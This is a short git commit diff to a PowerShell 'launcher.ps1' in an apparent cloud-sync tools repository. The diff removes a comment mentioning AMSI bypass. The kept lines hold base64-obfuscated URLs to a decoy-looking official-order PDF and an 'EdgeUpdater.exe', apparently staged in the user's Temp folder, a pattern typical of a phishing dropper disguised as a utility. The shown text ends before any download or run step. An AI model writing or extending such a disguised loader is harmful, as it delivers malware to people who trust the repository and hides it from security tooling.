6c0cf06977a3b0272f2c926e7ed22f68d43c8b52
123456 <273391509+astro-opensource@users.noreply.github.com>
2026-04-05 20:23:28 +0300

    Update launcher.ps1

--- assets/launcher.ps1
+++ assets/launcher.ps1
@@ -1,4 +1,3 @@
-# launcher.ps1 - No AMSI bypass, no registry, no byte patches
 $p = (Get-ChildItem Env:Temp).Value
 $a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
 $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
